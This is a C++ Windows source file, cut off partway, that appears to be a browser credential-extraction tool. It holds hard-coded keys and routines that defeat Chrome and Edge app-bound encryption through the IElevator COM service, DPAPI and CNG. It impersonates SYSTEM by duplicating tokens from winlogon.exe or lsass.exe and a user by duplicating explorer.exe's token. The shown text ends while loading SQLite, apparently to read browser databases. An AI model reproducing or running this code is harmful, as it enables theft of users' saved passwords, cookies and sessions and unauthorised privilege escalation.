#ifndef UNICODE
#define UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>
#include <bcrypt.h>
#include <ncrypt.h>
#include <wincrypt.h>
#include <objbase.h>
#include <oleauto.h>
#include <tlhelp32.h>

#include <algorithm>
#include <cstdint>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <functional>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>

#ifdef _MSC_VER
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ncrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")
#endif

#ifndef BCRYPT_CHACHA20_POLY1305_ALGORITHM
#define BCRYPT_CHACHA20_POLY1305_ALGORITHM L"CHACHA20_POLY1305"
#endif
#ifndef MS_KEY_STORAGE_PROVIDER
#define MS_KEY_STORAGE_PROVIDER L"Microsoft Software Key Storage Provider"
#endif

namespace fs = std::filesystem;
using Bytes = std::vector<uint8_t>;

// ---------------------------------------------------------------------------
// Post-processing keys (Chrome 137+ / 148)
// ---------------------------------------------------------------------------
static const uint8_t kAesPostKey[32] = {
    0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
    0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87 };

static const uint8_t kChaChaPostKey[32] = {
    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60 };

static const uint8_t kXorPostKey[32] = {
    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90 };

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static int b64Index(unsigned char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static bool b64Decode(const std::string& text, Bytes& out) {
    out.clear();
    uint32_t acc = 0;
    int bits = 0;
    for (unsigned char c : text) {
        if (c == '=') break;
        int v = b64Index(c);
        if (v < 0) continue;
        acc = (acc << 6) | static_cast<uint32_t>(v);
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out.push_back(static_cast<uint8_t>((acc >> bits) & 0xFF));
        }
    }
    return !out.empty();
}

static std::string b64Encode(const uint8_t* data, size_t size) {
    static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    out.reserve(((size + 2) / 3) * 4);
    size_t i = 0;
    while (i + 3 <= size) {
        uint32_t v = (static_cast<uint32_t>(data[i]) << 16) |
            (static_cast<uint32_t>(data[i + 1]) << 8) | data[i + 2];
        out.push_back(table[(v >> 18) & 0x3F]);
        out.push_back(table[(v >> 12) & 0x3F]);
        out.push_back(table[(v >> 6) & 0x3F]);
        out.push_back(table[v & 0x3F]);
        i += 3;
    }
    if (size - i == 1) {
        uint32_t v = static_cast<uint32_t>(data[i]) << 16;
        out.push_back(table[(v >> 18) & 0x3F]);
        out.push_back(table[(v >> 12) & 0x3F]);
        out += "==";
    }
    else if (size - i == 2) {
        uint32_t v = (static_cast<uint32_t>(data[i]) << 16) |
            (static_cast<uint32_t>(data[i + 1]) << 8);
        out.push_back(table[(v >> 18) & 0x3F]);
        out.push_back(table[(v >> 12) & 0x3F]);
        out.push_back(table[(v >> 6) & 0x3F]);
        out.push_back('=');
    }
    return out;
}

static int hexNibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static bool hexDecode(const std::string& text, Bytes& out) {
    if (text.empty() || text.size() % 2 != 0) return false;
    out.clear();
    out.reserve(text.size() / 2);
    for (size_t i = 0; i < text.size(); i += 2) {
        int hi = hexNibble(text[i]);
        int lo = hexNibble(text[i + 1]);
        if (hi < 0 || lo < 0) return false;
        out.push_back(static_cast<uint8_t>((hi << 4) | lo));
    }
    return true;
}

static bool validUtf8(const uint8_t* data, size_t size) {
    size_t i = 0;
    while (i < size) {
        uint8_t c = data[i];
        if (c < 0x80) { ++i; continue; }
        int length = 0;
        if ((c & 0xE0) == 0xC0) length = 2;
        else if ((c & 0xF0) == 0xE0) length = 3;
        else if ((c & 0xF8) == 0xF0) length = 4;
        else return false;
        if (i + static_cast<size_t>(length) > size) return false;
        for (int k = 1; k < length; ++k)
            if ((data[i + k] & 0xC0) != 0x80) return false;
        i += length;
    }
    return true;
}

static uint32_t readU32(const uint8_t* p) {
    return static_cast<uint32_t>(p[0]) | (static_cast<uint32_t>(p[1]) << 8) |
        (static_cast<uint32_t>(p[2]) << 16) | (static_cast<uint32_t>(p[3]) << 24);
}

static bool readText(const fs::path& path, std::string& out) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return false;
    std::ostringstream buffer;
    buffer << file.rdbuf();
    out = buffer.str();
    return true;
}

static bool jsonString(const std::string& text, const char* key, std::string& value) {
    std::string pattern = "\"";
    pattern += key;
    pattern += "\"";
    size_t pos = text.find(pattern);
    if (pos == std::string::npos) return false;
    pos = text.find(':', pos + pattern.size());
    if (pos == std::string::npos) return false;
    pos = text.find('"', pos + 1);
    if (pos == std::string::npos) return false;

    std::string result;
    for (size_t i = pos + 1; i < text.size(); ++i) {
        char c = text[i];
        if (c == '\\' && i + 1 < text.size()) {
            char escaped = text[++i];
            switch (escaped) {
            case 'n': result += '\n'; break;
            case 'r': result += '\r'; break;
            case 't': result += '\t'; break;
            case '\\': result += '\\'; break;
            case '"': result += '"'; break;
            default: result += escaped; break;
            }
        }
        else if (c == '"') {
            value = result;
            return true;
        }
        else {
            result += c;
        }
    }
    return false;
}

static fs::path localAppDataPath() {
    wchar_t buffer[32768];
    DWORD length = GetEnvironmentVariableW(L"LOCALAPPDATA", buffer, 32768);
    if (length == 0 || length >= 32768) return {};
    return fs::path(std::wstring(buffer, length));
}

static std::wstring utf8ToWide(const std::string& text) {
    if (text.empty()) return {};
    int length = MultiByteToWideChar(CP_UTF8, 0, text.data(), static_cast<int>(text.size()), nullptr, 0);
    if (length <= 0) return {};
    std::wstring result(static_cast<size_t>(length), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, text.data(), static_cast<int>(text.size()), result.data(), length);
    return result;
}

static std::wstring currentExecutablePath() {
    std::wstring buffer(MAX_PATH, L'\0');
    for (;;) {
        DWORD length = GetModuleFileNameW(nullptr, buffer.data(), static_cast<DWORD>(buffer.size()));
        if (length == 0) return {};
        if (length < buffer.size()) {
            buffer.resize(length);
            return buffer;
        }
        buffer.resize(buffer.size() * 2);
    }
}

static std::wstring quoteArgument(const std::wstring& argument) {
    if (argument.find_first_of(L" \t\"") == std::wstring::npos) return argument;
    std::wstring result = L"\"";
    size_t backslashes = 0;
    for (wchar_t c : argument) {
        if (c == L'\\') { ++backslashes; continue; }
        if (c == L'"') {
            result.append(backslashes * 2 + 1, L'\\');
            result.push_back(L'"');
            backslashes = 0;
            continue;
        }
        result.append(backslashes, L'\\');
        backslashes = 0;
        result.push_back(c);
    }
    result.append(backslashes * 2, L'\\');
    result.push_back(L'"');
    return result;
}

static bool isProcessElevated() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return false;
    TOKEN_ELEVATION elevation{};
    DWORD size = 0;
    bool elevated = false;
    if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size))
        elevated = elevation.TokenIsElevated != 0;
    CloseHandle(token);
    return elevated;
}

static std::string consoleText(const std::string& value) {
    std::string result;
    result.reserve(value.size());
    for (char c : value) {
        if (c == '\n') result += "\\n";
        else if (c == '\r') result += "\\r";
        else if (c == '\t') result += "\\t";
        else result.push_back(c);
    }
    return result;
}

// ---------------------------------------------------------------------------
// Crypto primitives
// ---------------------------------------------------------------------------
static bool sha256(const uint8_t* data, size_t size, uint8_t out[32]) {
    BCRYPT_ALG_HANDLE algorithm = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&algorithm, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
        return false;
    DWORD objectLength = 0, hashLength = 0, returned = 0;
    BCRYPT_HASH_HANDLE hash = nullptr;
    bool ok = false;
    if (BCRYPT_SUCCESS(BCryptGetProperty(algorithm, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PUCHAR>(&objectLength), sizeof(objectLength), &returned, 0)) &&
        BCRYPT_SUCCESS(BCryptGetProperty(algorithm, BCRYPT_HASH_LENGTH, reinterpret_cast<PUCHAR>(&hashLength), sizeof(hashLength), &returned, 0)) &&
        hashLength == 32) {
        std::vector<uint8_t> object(objectLength);
        if (BCRYPT_SUCCESS(BCryptCreateHash(algorithm, &hash, object.data(), objectLength, nullptr, 0, 0))) {
            ok = BCRYPT_SUCCESS(BCryptHashData(hash, const_cast<PUCHAR>(data), static_cast<ULONG>(size), 0)) &&
                BCRYPT_SUCCESS(BCryptFinishHash(hash, out, 32, 0));
            BCryptDestroyHash(hash);
        }
    }
    BCryptCloseAlgorithmProvider(algorithm, 0);
    return ok;
}

static bool aesGcmDecrypt(const Bytes& key, const uint8_t* nonce, size_t nonceLength,
    const uint8_t* ciphertext, size_t ciphertextLength,
    const uint8_t* tag, size_t tagLength, Bytes& out) {
    if (key.size() != 16 && key.size() != 24 && key.size() != 32) return false;
    if (nonceLength == 0 || tagLength != 16) return false;

    BCRYPT_ALG_HANDLE algorithm = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&algorithm, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return false;

    bool ok = false;
    if (BCRYPT_SUCCESS(BCryptSetProperty(algorithm, BCRYPT_CHAINING_MODE,
        reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)),
        sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
        DWORD objectLength = 0, returned = 0;
        BCRYPT_KEY_HANDLE keyHandle = nullptr;
        if (BCRYPT_SUCCESS(BCryptGetProperty(algorithm, BCRYPT_OBJECT_LENGTH,
            reinterpret_cast<PUCHAR>(&objectLength), sizeof(objectLength), &returned, 0))) {
            std::vector<uint8_t> object(objectLength);
            if (BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(algorithm, &keyHandle, object.data(), objectLength,
                const_cast<PUCHAR>(key.data()), static_cast<ULONG>(key.size()), 0))) {
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
                BCRYPT_INIT_AUTH_MODE_INFO(info);
                info.pbNonce = const_cast<PUCHAR>(nonce);
                info.cbNonce = static_cast<ULONG>(nonceLength);
                info.pbTag = const_cast<PUCHAR>(tag);
                info.cbTag = static_cast<ULONG>(tagLength);

                out.resize(ciphertextLength);
                ULONG written = 0;
                NTSTATUS status = BCryptDecrypt(keyHandle, const_cast<PUCHAR>(ciphertext),
                    static_cast<ULONG>(ciphertextLength), &info, nullptr, 0,
                    out.empty() ? nullptr : out.data(), static_cast<ULONG>(out.size()), &written, 0);
                if (BCRYPT_SUCCESS(status)) {
                    out.resize(written);
                    ok = true;
                }
                else {
                    out.clear();
                }
                BCryptDestroyKey(keyHandle);
            }
        }
    }
    BCryptCloseAlgorithmProvider(algorithm, 0);
    return ok;
}

static bool chacha20Poly1305Decrypt(const Bytes& key, const uint8_t* nonce, size_t nonceLength,
    const uint8_t* ciphertext, size_t ciphertextLength,
    const uint8_t* tag, size_t tagLength, Bytes& out) {
    if (key.size() != 32 || nonceLength != 12 || tagLength != 16) return false;

    BCRYPT_ALG_HANDLE algorithm = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&algorithm, BCRYPT_CHACHA20_POLY1305_ALGORITHM, nullptr, 0)))
        return false;

    bool ok = false;
    DWORD objectLength = 0, returned = 0;
    BCRYPT_KEY_HANDLE keyHandle = nullptr;
    if (BCRYPT_SUCCESS(BCryptGetProperty(algorithm, BCRYPT_OBJECT_LENGTH,
        reinterpret_cast<PUCHAR>(&objectLength), sizeof(objectLength), &returned, 0))) {
        std::vector<uint8_t> object(objectLength);
        if (BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(algorithm, &keyHandle, object.data(), objectLength,
            const_cast<PUCHAR>(key.data()), static_cast<ULONG>(key.size()), 0))) {
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
            BCRYPT_INIT_AUTH_MODE_INFO(info);
            info.pbNonce = const_cast<PUCHAR>(nonce);
            info.cbNonce = static_cast<ULONG>(nonceLength);
            info.pbTag = const_cast<PUCHAR>(tag);
            info.cbTag = static_cast<ULONG>(tagLength);

            out.resize(ciphertextLength);
            ULONG written = 0;
            NTSTATUS status = BCryptDecrypt(keyHandle, const_cast<PUCHAR>(ciphertext),
                static_cast<ULONG>(ciphertextLength), &info, nullptr, 0,
                out.empty() ? nullptr : out.data(), static_cast<ULONG>(out.size()), &written, 0);
            if (BCRYPT_SUCCESS(status)) {
                out.resize(written);
                ok = true;
            }
            else {
                out.clear();
            }
            BCryptDestroyKey(keyHandle);
        }
    }
    BCryptCloseAlgorithmProvider(algorithm, 0);
    return ok;
}

static bool dpapiUnprotect(const Bytes& input, Bytes& output) {
    if (input.empty()) return false;
    DATA_BLOB in{ static_cast<DWORD>(input.size()), const_cast<BYTE*>(input.data()) };
    DATA_BLOB out{};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return false;
    output.assign(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return true;
}

static bool chromiumCngDecrypt(const Bytes& input, Bytes& output) {
    NCRYPT_PROV_HANDLE provider = 0;
    if (NCryptOpenStorageProvider(&provider, MS_KEY_STORAGE_PROVIDER, 0) != 0) return false;
    NCRYPT_KEY_HANDLE key = 0;
    if (NCryptOpenKey(provider, &key, L"Google Chromekey1", 0, 0) != 0) {
        NCryptFreeObject(provider);
        return false;
    }

    DWORD needed = 0;
    bool ok = false;
    if (NCryptDecrypt(key, const_cast<PBYTE>(input.data()), static_cast<DWORD>(input.size()),
        nullptr, nullptr, 0, &needed, NCRYPT_SILENT_FLAG) == 0 && needed > 0) {
        output.resize(needed);
        if (NCryptDecrypt(key, const_cast<PBYTE>(input.data()), static_cast<DWORD>(input.size()),
            nullptr, output.data(), needed, &needed, NCRYPT_SILENT_FLAG) == 0) {
            output.resize(needed);
            ok = true;
        }
        else {
            output.clear();
        }
    }
    NCryptFreeObject(key);
    NCryptFreeObject(provider);
    return ok;
}

// ---------------------------------------------------------------------------
// Privilege / token helpers
// ---------------------------------------------------------------------------
static bool enablePrivilege(const wchar_t* name) {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueW(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES privileges{};
        privileges.PrivilegeCount = 1;
        privileges.Privileges[0].Luid = luid;
        privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), nullptr, nullptr);
        ok = GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(token);
    return ok;
}

static bool processIsSystem() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return false;
    BYTE sid[SECURITY_MAX_SID_SIZE];
    DWORD sidSize = sizeof(sid);
    bool isSystem = false;
    if (CreateWellKnownSid(WinLocalSystemSid, nullptr, sid, &sidSize)) {
        BOOL member = FALSE;
        if (CheckTokenMembership(token, sid, &member)) isSystem = member != FALSE;
    }
    CloseHandle(token);
    return isSystem;
}

static DWORD findProcessId(const wchar_t* name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    DWORD pid = 0;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, name) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

static HANDLE duplicateProcessToken(HANDLE process, bool primary) {
    HANDLE token = nullptr;
    if (!OpenProcessToken(process, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &token))
        return nullptr;
    HANDLE result = nullptr;
    if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation,
        primary ? TokenPrimary : TokenImpersonation, &result))
        result = nullptr;
    CloseHandle(token);
    return result;
}

static HANDLE openProcessTokenByName(const wchar_t* name, bool primary) {
    DWORD pid = findProcessId(name);
    if (pid == 0) return nullptr;
    HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    HANDLE token = nullptr;
    if (process) {
        token = duplicateProcessToken(process, primary);
        CloseHandle(process);
    }
    if (!token) {
        process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (process) {
            token = duplicateProcessToken(process, primary);
            CloseHandle(process);
        }
    }
    return token;
}

static bool withSystemToken(const std::function<bool()>& callback) {
    if (processIsSystem()) return callback();
    const wchar_t* candidates[] = { L"winlogon.exe", L"lsass.exe" };
    for (const wchar_t* candidate : candidates) {
        HANDLE token = openProcessTokenByName(candidate, false);
        if (!token) continue;
        bool ok = false;
        if (ImpersonateLoggedOnUser(token)) {
            ok = callback();
            RevertToSelf();
        }
        CloseHandle(token);
        if (ok) return true;
    }
    return false;
}

// ---------------------------------------------------------------------------
// App-bound key derivation
// ---------------------------------------------------------------------------
static bool deriveAppBoundKey(const Bytes& blob, Bytes& key, std::string& error) {
    key.clear();
    if (blob.size() >= 8) {
        uint32_t headerLength = readU32(blob.data());
        uint64_t contentLengthOffset = 4ull + headerLength;
        if (contentLengthOffset + 4 <= blob.size()) {
            uint32_t contentLength = readU32(blob.data() + contentLengthOffset);
            size_t contentOffset = static_cast<size_t>(contentLengthOffset + 4);
            if (contentLength <= blob.size() - contentOffset) {
                const uint8_t* content = blob.data() + contentOffset;

                if (contentLength == 32) {
                    key.assign(content, content + 32);
                    return true;
                }

                if (contentLength >= 1) {
                    uint8_t flag = content[0];
                    if ((flag == 1 || flag == 2) && contentLength >= 1 + 12 + 32 + 16) {
                        const uint8_t* nonce = content + 1;
                        const uint8_t* ciphertext = nonce + 12;
                        const uint8_t* tag = ciphertext + 32;
                        if (flag == 1) {
                            Bytes postKey(kAesPostKey, kAesPostKey + 32);
                            if (aesGcmDecrypt(postKey, nonce, 12, ciphertext, 32, tag, 16, key))
                                return true;
                            error = "AES post-processing layer failed";
                        }
                        else {
                            Bytes postKey(kChaChaPostKey, kChaChaPostKey + 32);
                            if (chacha20Poly1305Decrypt(postKey, nonce, 12, ciphertext, 32, tag, 16, key))
                                return true;
                            error = "ChaCha20-Poly1305 post-processing layer failed";
                        }
                        return false;
                    }

                    if (flag == 3 && contentLength >= 1 + 32 + 12 + 32 + 16) {
                        Bytes encryptedKey(content + 1, content + 1 + 32);
                        Bytes cngPlain;
                        bool cngOk = chromiumCngDecrypt(encryptedKey, cngPlain);
                        if (!cngOk) {
                            withSystemToken([&]() {
                                cngOk = chromiumCngDecrypt(encryptedKey, cngPlain);
                                return cngOk;
                                });
                        }
                        if (!cngOk || cngPlain.size() < 32) {
                            error = "CNG 'Google Chromekey1' decrypt failed";
                            return false;
                        }

                        Bytes aesKey(32);
                        for (size_t i = 0; i < 32; ++i)
                            aesKey[i] = static_cast<uint8_t>(cngPlain[i] ^ kXorPostKey[i]);
                        const uint8_t* nonce = content + 1 + 32;
                        const uint8_t* ciphertext = nonce + 12;
                        const uint8_t* tag = ciphertext + 32;
                        if (aesGcmDecrypt(aesKey, nonce, 12, ciphertext, 32, tag, 16, key))
                            return true;
                        error = "flag-3 AES-GCM layer failed";
                        return false;
                    }
                    error = "unsupported app-bound key post-processing flag " + std::to_string(flag);
                    return false;
                }
            }
        }
    }

    if (blob.size() == 16 || blob.size() == 24 || blob.size() == 32) {
        key = blob;
        return true;
    }
    error = "unrecognized app-bound key blob";
    return false;
}

static bool extractValidationPath(const Bytes& blob, std::wstring& path) {
    path.clear();
    if (blob.size() < 5) return false;
    uint32_t headerLength = readU32(blob.data());
    if (headerLength == 0 || 4ull + headerLength > blob.size()) return false;

    const uint8_t* header = blob.data() + 4;
    uint8_t protectionLevel = header[0];
    size_t offset = 0;
    if (protectionLevel == 1 || protectionLevel == 2) offset = 1;
    else if (protectionLevel == 3) offset = 2;
    if (offset >= headerLength) return false;

    std::string text(reinterpret_cast<const char*>(header + offset),
        static_cast<size_t>(headerLength) - offset);
    size_t start = std::string::npos;
    for (size_t i = 0; i + 2 < text.size(); ++i) {
        char c = text[i];
        if (((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')) &&
            text[i + 1] == ':' && (text[i + 2] == '\\' || text[i + 2] == '/')) {
            start = i;
            break;
        }
    }
    if (start == std::string::npos) return false;

    std::string pathUtf8 = text.substr(start);
    while (!pathUtf8.empty() &&
        (pathUtf8.back() == '\0' || pathUtf8.back() == '\\' || pathUtf8.back() == '/'))
        pathUtf8.pop_back();
    if (pathUtf8.empty()) return false;

    path = utf8ToWide(pathUtf8);
    return !path.empty();
}

// ---------------------------------------------------------------------------
// IElevator COM
// ---------------------------------------------------------------------------
struct IElevatorV1 : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int protectionLevel, BSTR plaintext,
        BSTR* ciphertext, DWORD* lastError) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(BSTR ciphertext, BSTR* plaintext,
        DWORD* lastError) = 0;
};

struct IEdgeElevatorV1 : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE EdgePlaceholder1() = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgePlaceholder2() = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgePlaceholder3() = 0;
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int protectionLevel, BSTR plaintext,
        BSTR* ciphertext, DWORD* lastError) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(BSTR ciphertext, BSTR* plaintext,
        DWORD* lastError) = 0;
};

static const CLSID kChromeElevationClsid = {
    0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
static const IID kChromeElevator2Iid = {
    0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };
static const IID kIElevator2Iid = {
    0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05} };

static const CLSID kEdgeElevationClsid = {
    0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
static const IID kEdgeElevator2Iid = {
    0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05} };
static const IID kEdgeElevator1Iid = {
    0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };

template <typename Interface>
static HRESULT callElevator(const CLSID& clsid, const IID& iid, const Bytes& input,
    Bytes& output, DWORD& serviceError) {
    Interface* elevator = nullptr;
    HRESULT hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid,
        reinterpret_cast<void**>(&elevator));
    if (FAILED(hr) || !elevator) return FAILED(hr) ? hr : E_POINTER;

    CoSetProxyBlanket(elevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);

    BSTR bstrInput = SysAllocStringByteLen(reinterpret_cast<const char*>(input.data()),
        static_cast<UINT>(input.size()));
    if (!bstrInput) {
        elevator->Release();
        return E_OUTOFMEMORY;
    }

    BSTR bstrOutput = nullptr;
    DWORD lastError = 0;
    hr = elevator->DecryptData(bstrInput, &bstrOutput, &lastError);
    serviceError = lastError;
    SysFreeString(bstrInput);

    if (SUCCEEDED(hr) && bstrOutput) {
        UINT length = SysStringByteLen(bstrOutput);
        output.assign(reinterpret_cast<uint8_t*>(bstrOutput),
            reinterpret_cast<uint8_t*>(bstrOutput) + length);
        SysFreeString(bstrOutput);
    }
    else if (bstrOutput) {
        SysFreeString(bstrOutput);
    }
    elevator->Release();
    return hr;
}

static bool decryptWithElevator(const Bytes& wrapped, bool edge, Bytes& key, std::string& error) {
    HRESULT init = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    bool shouldUninitialize = SUCCEEDED(init);

    HRESULT results[2] = { E_FAIL, E_FAIL };
    DWORD serviceErrors[2] = { 0, 0 };
    for (int attempt = 0; attempt < 2; ++attempt) {
        if (edge) {
            results[attempt] = callElevator<IEdgeElevatorV1>(
                kEdgeElevationClsid,
                attempt == 0 ? kEdgeElevator2Iid : kEdgeElevator1Iid, wrapped, key,
                serviceErrors[attempt]);
        }
        else {
            results[attempt] = callElevator<IElevatorV1>(
                kChromeElevationClsid,
                attempt == 0 ? kChromeElevator2Iid : kIElevator2Iid, wrapped, key,
                serviceErrors[attempt]);
        }
        if (SUCCEEDED(results[attempt]) && key.size() >= 16) {
            if (shouldUninitialize) CoUninitialize();
            return true;
        }
    }

    if (shouldUninitialize) CoUninitialize();
    std::ostringstream message;
    message << "IElevator DecryptData failed (primary 0x" << std::hex
        << static_cast<uint32_t>(results[0]) << ", fallback 0x"
        << static_cast<uint32_t>(results[1]) << "; service errors "
        << std::dec << serviceErrors[0] << "/" << serviceErrors[1] << ")";
    error = message.str();
    return false;
}

static bool systemDpapiUnwrap(const Bytes& wrapped, Bytes& inner, std::string& error) {
    Bytes outer;
    bool outerOk = false;

    if (processIsSystem()) {
        outerOk = dpapiUnprotect(wrapped, outer);
    }
    else {
        outerOk = withSystemToken([&]() { return dpapiUnprotect(wrapped, outer); });
    }
    if (!outerOk) {
        error = "SYSTEM DPAPI layer failed (run elevated as the profile owner)";
        return false;
    }

    if (!dpapiUnprotect(outer, inner)) {
        bool userOk = false;
        HANDLE token = openProcessTokenByName(L"explorer.exe", false);
        if (token) {
            if (ImpersonateLoggedOnUser(token)) {
                userOk = dpapiUnprotect(outer, inner);
                RevertToSelf();
            }
            CloseHandle(token);
        }
        if (!userOk) {
            error = "user DPAPI layer failed (run as the profile owner)";
            return false;
        }
    }
    return true;
}

// ---------------------------------------------------------------------------
// SQLite via winsqlite3.dll
// ---------------------------------------------------------------------------
struct sqlite3;
struct sqlite3_stmt;

struct SqliteApi {
    HMODULE module = nullptr;
    int (*open16)(const void*, sqlite3**) = nullptr;
    int (*prepare)(sqlite3*, const char*, int, sqlite3_stmt**, const char**) = nullptr;
    int (*step)(sqlite3_stmt*) = nullptr;
    int (*finalize)(sqlite3_stmt*) = nullptr;
    int (*close)(sqlite3*) = nullptr;
    const unsigned char* (*columnText)(sqlite3_stmt*, int) = nullptr;
    const void* (*columnBlob)(sqlite3_stmt*, int) = nullptr;
    int (*columnBytes)(sqlite3_stmt*, int) = nullptr;
    int (*columnType)(sqlite3_stmt*, int) = nullptr;
    int (*columnInt)(sqlite3_stmt*, int) = nullptr;
    long long (*columnInt64)(sqlite3_stmt*, int) = nullptr;
    int (*busyTimeout)(sqlite3*, int) = nullptr;

    bool load() {
        module = LoadLibraryW(L"winsqlite3.dll");
        if (!module) return false;
        bool ok = true;
#define LOAD_SQLITE(field, name) \
    do { field = reinterpret_cast<decltype(field)>(GetProcAddress(module, name)); if (!field) ok = false; } while (0)
        LOAD_SQLITE(open16, "sqlite3_open16");
        LOAD_SQLITE(prepare, "sqlite3_prepare_v2");
        LOAD_SQLITE(step, "sqlite3_step");
        LOAD_SQLITE(finalize, "sqlite3_finalize");
        LOAD_SQLITE(close, "sqlite3_close");
        LOAD_SQLITE(columnText, "sqlite3_column_text");
        LOAD_SQLITE(columnBlob, "sqlite3_column_blob");
        LOAD_SQLITE(columnBytes, "sqlite3_column_bytes");
        LOAD_SQLITE(columnType, "sqlite3_column_type");
        LOAD_SQLITE(columnInt, "sqlite3_column_int");
        LOAD_SQLITE(columnInt64, "sqlite3_column_int64");
